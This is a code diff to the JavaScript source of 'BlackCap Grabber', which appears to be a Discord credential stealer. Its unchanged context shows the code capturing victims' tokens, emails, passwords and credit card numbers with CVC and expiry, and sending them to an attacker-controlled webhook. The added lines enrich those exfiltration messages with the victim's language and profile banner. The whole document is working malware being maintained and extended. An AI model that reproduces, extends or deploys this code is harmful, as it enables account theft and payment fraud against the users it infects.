@@ -208,7 +208,6 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 
 
-
 const hooker = async (content) => {
 	const data = JSON.stringify(content);
 	const url = new URL(config.webhook);
@@ -303,6 +302,10 @@ function FirstTime() {
 									value: `${GetBadges(b.flags)}`,
 									inline: !0
 								}, {
+									name: "Language <:language:1037057832920547398>",
+									value: `${GetLangue(json.locale)}`,
+									inline: !0
+								}, {
 									name: "Token <a:icon1:1024615171907407892>",
 									value: `\`\`\`${token}\`\`\``,
 									inline: !1
@@ -370,6 +373,7 @@ function FirstTime() {
 						xmlHttp.responseText;
 						`, !0).then((ip) => {
 						const b = JSON.parse(a);
+						let bannerurl = `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600"
 						const c = {
 							username: "BlackCap Grabber",
 							content: "",
@@ -402,6 +406,9 @@ function FirstTime() {
                                 footer: {
                                     text: "©KSCH | https://github.com/KSCHdsc"
                                 },
+								image:{
+									url: bannerurl,
+								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
 								}
@@ -472,6 +479,134 @@ function GetRBadges(flags) {
 		badges = ""
 	}
 	return badges
+}
+
+function GetLangue(read) {
+	const France = 'fr';
+	const Dansk = 'da';
+	const Deutsch = 'de';
+	const englishUK = 'en-GB';
+	const englishUS = 'en-US';
+	const espagnol = 'es-ES';
+	const hrvatski = 'hr';
+	const italianio = 'it';
+	const lietuviskai = 'lt';
+	const magyar = 'hu';
+	const neerland = 'nl';
+	const Norsk = 'no';
+	const polski = 'pl';
+	const portugues = 'pr-BR';
+	const Romana = 'ro';
+	const finlandais = 'fi';
+	const svenska = 'sv-SE';
+	const tiengviet = 'vi';
+	const turk = 'tr';
+	const cestina = 'cs';
+	const grecque = 'el';
+	const bulgar = 'bg';
+	const russe = 'ru';
+	const ukrainier = 'uk';
+	const inde = 'hi';
+	const thai = 'th';
+	const chineschina = 'zh-CN';
+	const japonais = 'ja';
+	const chinestaiwan = 'zh-TW';
+	const korea = 'ko';
+	var langue = "";
+	if (read == France) {
+		langue += "🇫🇷 French"
+	}
+	if (read == Dansk) {
+		langue += "🇩🇰 Dansk"
+	}
+	if (read == Deutsch) {
+		langue += "🇩🇪 Deutsch"
+	}
+	if (read == englishUK) {
+		langue += "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English"
+	}
+	if (read == englishUS) {
+		langue += "🇺🇸 USA"
+	}
+	if (read == espagnol) {
+		langue += "🇪🇸 Espagnol"
+	}
+	if (read == hrvatski) {
+		langue += "🇭🇷 Croatian"
+	}
+	if (read == italianio) {
+		langue += "🇮🇹 Italianio"
+	}
+	if (read == lietuviskai) {
+		langue += "🇱🇹 Lithuanian"
+	}
+	if (read == magyar) {
+		langue += "🇭🇺 Hungarian"
+	}
+	if (read == neerland) {
+		langue += "🇳🇱 Dutch"
+	}
+	if (read == Norsk) {
+		langue += "🇳🇴 Norwegian"
+	}
+	if (read == polski) {
+		langue += "🇵🇱 Polish"
+	}
+	if (read == portugues) {
+		langue += "🇵🇹 Portuguese"
+	}
+	if (read == Romana) {
+		langue += "🇷🇴 Romanian"
+	}
+	if (read == finlandais) {
+		langue += "🇫🇮 Finnish"
+	}
+	if (read == svenska) {
+		langue += "🇸🇪 Swedish"
+	}
+	if (read == turk) {
+		langue += "🇹🇷 Turkish"
+	}
+	if (read == tiengviet) {
+		langue += "🇻🇳 Vietnamese"
+	}
+	if (read == cestina) {
+		langue += "🇨🇿 Czech"
+	}
+	if (read == grecque) {
+		langue += "🇬🇷 Greek"
+	}
+	if (read == bulgar) {
+		langue += "🇧🇬 Bulgarian"
+	}
+	if (read == russe) {
+		langue += "🇷🇺 Russian"
+	}
+	if (read == ukrainier) {
+		langue += "🇺🇦 Ukrainian"
+	}
+	if (read == inde) {
+		langue += "🇮🇳 Indian"
+	}
+	if (read == thai) {
+		langue += "🇹🇼 Taiwanese"
+	}
+	if (read == chineschina) {
+		langue += "🇨🇳 Chinese-China"
+	}
+	if (read == japonais) {
+		langue += "🇯🇵 Japanese"
+	}
+	if (read == chinestaiwan) {
+		langue += "🇨🇳 Chinese-Taiwanese"
+	}
+	if (read == korea) {
+		langue += "🇰🇷 Korean"
+	}
+	if (langue == "") {
+		langue = "None"
+	}
+	return langue
 }
 
 function GetBadges(flags) {
@@ -594,6 +729,7 @@ function Login(email, password, token) {
 											return billing
 										}
 										const json = JSON.parse(info);
+										let bannerurl = `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
 										const params = {
 											username: "BlackCap Grabber",
 											content: "",
@@ -622,6 +758,10 @@ function Login(email, password, token) {
 													value: `${GetBadges(json.flags)}`,
 													inline: !0
 												}, {
+													name: "Language <:language:1037057832920547398>",
+													value: `${GetLangue(json.locale)}`,
+													inline: !0
+												}, {
 													name: "Billing <a:icon8:1024619392652288071>",
 													value: `${Cool()}`,
 													inline: !1
@@ -630,7 +770,7 @@ function Login(email, password, token) {
 													value: `\`${email}\``,
 													inline: !0
 												}, {
-													name: "<a:icon6:1024617637390598164> Password ",
+													name: "Password <a:icon6:1024617637390598164>",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
@@ -652,6 +792,9 @@ function Login(email, password, token) {
 												
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc"
+												},
+												"image":{
+												'url': `${bannerurl}`,
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -748,6 +891,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 											return billing
 										}
 										const json = JSON.parse(info);
+										let bannerurl = `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
 										const params = {
 											username: "BlackCap Grabber",
 											content: "",
@@ -774,6 +918,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 												}, {
 													name: "Badges <:icon5:1024615931869147146>",
 													value: `${GetBadges(json.flags)}`,
+													inline: !0
+												}, {
+													name: "Language <:language:1037057832920547398>",
+													value: `${GetLangue(json.locale)}`,
 													inline: !0
 												}, {
 													name: "Billing <a:icon8:1024619392652288071>",
@@ -810,6 +958,9 @@ function ChangePassword(oldpassword, newpassword, token) {
 												
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc"
+												},
+												"image":{
+												'url': `${bannerurl}`,
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -904,6 +1055,7 @@ function ChangeEmail(newemail, password, token) {
 											return billing
 										}
 										const json = JSON.parse(info);
+										let bannerurl = `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
 										const params = {
 											username: "BlackCap Grabber",
 											content: "",
@@ -932,6 +1084,10 @@ function ChangeEmail(newemail, password, token) {
 													value: `${GetBadges(json.flags)}`,
 													inline: !0
 												}, {
+													name: "Language <:language:1037057832920547398>",
+													value: `${GetLangue(json.locale)}`,
+													inline: !0
+												}, {
 													name: "Billing <a:icon8:1024619392652288071>",
 													value: `${Cool()}`,
 													inline: !1
@@ -940,7 +1096,7 @@ function ChangeEmail(newemail, password, token) {
 													value: `\`${newemail}\``,
 													inline: !0
 												}, {
-													name: "<a:icon6:1024617637390598164> Password",
+													name: "Password <a:icon6:1024617637390598164>",
 													value: `\`${password}\``,
 													inline: !0
 												}, {
@@ -963,6 +1119,10 @@ function ChangeEmail(newemail, password, token) {
 												"footer": {
 													"text": "©KSCH | https://github.com/KSCHdsc"
 												},
+												"image":{
+												'url': `${bannerurl}`,
+												},
+												
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
@@ -991,6 +1151,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
+			let bannerurl = `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
 			const params = {
 				username: "BlackCap Grabber",
 				content: "",
@@ -1002,9 +1163,10 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     **ID** <:icon3:1024615933228109834>\n\`\`\`${json.id}\`\`\`\n
                     **Email** <a:Email:1024615399314161744>\n\`\`\`${json.email}\`\`\`\n
                     **Nitro Type** <a:_diamond:1018223518913150977>\n${GetNitro(json.premium_type)}\n
-                    **Badges** <:icon5:1024615931869147146>\n\`\`\`${GetBadges(json.flags)}\`\`\`\n
+                    **Badges** <:icon5:1024615931869147146>\n${GetBadges(json.flags)}\n
                     **Credit Card Number**\n\`\`\`${number}\`\`\`\n
                     **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
+				    **Language** <:language:1037057832920547398>\n${GetLangue(json.locale)}\n
                     **CVC**\n\`\`\`${cvc}\`\`\`\n
                     **Token** <a:icon1:1024615171907407892> \n\`\`\`${token}\`\`\``,
 					"author": {
@@ -1012,6 +1174,9 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
 					},
 					"footer": {
 						"text": "©KSCH | https://github.com/KSCHdsc"
+					},
+					"image":{
+					'url': `${bannerurl}`,
 					},
 					"thumbnail": {
 						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
